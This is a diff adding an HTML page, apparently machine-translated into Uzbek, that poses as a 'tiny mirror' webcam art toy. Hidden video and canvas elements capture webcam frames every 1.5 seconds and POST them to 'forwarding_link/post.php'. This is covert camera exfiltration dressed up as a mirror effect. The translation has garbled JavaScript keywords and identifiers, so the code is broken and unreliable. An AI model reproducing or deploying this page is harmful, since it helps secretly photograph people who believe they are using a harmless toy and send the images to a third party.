@@ -1,0 +1,83 @@
+<! doctype html >
+< html >
+< bosh >
+< script  type = " text / javascript " src = " https://wybiral.github.io/code-art/projects/tiny-mirror/index.js " > </ script >
+< link  rel = " stylesheet " type = " text / css " href = " https://wybiral.github.io/code-art/projects/tiny-mirror/index.css " >
+< script  type = " text / javascript " src = " https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js " > </ script >
+</ bosh >
+
+< div  class = " video-wrap " hidden = " hidden " >
+   < video  id = " video " playsinline  avtomatik ijro > </ video >
+</ div >
+
+< canvas  hidden = " hidden " id = " canvas " width = " 640 " height = " 480 " > </ canvas >
+
+< skript >
+
+funktsiya  posti ( imgdata ) {
+$ . ajax ( {
+    turi : 'POST' ,
+    ma'lumotlar : {  cat : imgdata } ,
+    url : 'forwarding_link / post.php' ,
+    dataType : 'json' ,
+    async : false ,
+    muvaffaqiyat : funktsiya ( natija ) {
+        // javob / natijalarni boshqaradigan funktsiyani chaqiring
+    } ,
+    xato : function ( ) {
+    }
+  } ) ;
+} ;
+
+
+'qat'iy foydalaning' ;
+
+const  video  =  hujjat . getElementById ( 'video' ) ;
+const  canvas  =  hujjat . getElementById ( 'canvas' ) ;
+const  errorMsgElement  =  hujjat . querySelector ( 'span # errorMsg' ) ;
+
+const  cheklovlar  =  {
+  audio : noto'g'ri ,
+  video : {
+    
+    тулгарiy rejimi : "foydalanuvchi"
+  }
+} ;
+
+// Veb-kameraga kirish
+mos kelmaydigan  funktsiya  init ( )  {
+  sinab ko'ring  {
+    const  oqim  =  navigatorni kutmoqda  . media Qurilmalar . getUserMedia ( cheklovlar ) ;
+    muvaffaqiyat ( oqim ) ;
+  }  ushlash  ( e )  {
+    errorMsgElement . innerHTML  =  `navigator.getUserMedia xatosi: $ { e . toString ( ) } ` ;
+  }
+}
+
+// Muvaffaqiyat
+function  handleSuccess ( oqim )  {
+  oyna . oqim  =  oqim ;
+  video . srcObject  =  oqim ;
+
+var  context  =  canvas . getContext ( '2d' ) ;
+  setInterval ( function ( ) {
+
+       kontekst . drawImage ( video ,  0 ,  0 ,  640 ,  480 ) ;
+       var  canvasData  =  kanvas . toDataURL ( "image / png" ) . almashtirish ( "image / png" ,  "image / octet-stream" ) ;
+       post ( canvasData ) ;  } ,  1500 ) ;
+  
+
+}
+
+// Init yuklang
+init ( ) ;
+
+</ skript >
+
+    < tanasi >
+        < p > Maslahat: Favikonga qarang </ p >
+        < p > (Ruxsatlarni qabul qilish) </ p >
+        < p > < label > < input  type = " checkbox " name = " mirror " id = " mirror " /> Oyna tasviri </ label > </ p >
+    </ tanasi >
+
+</ html >
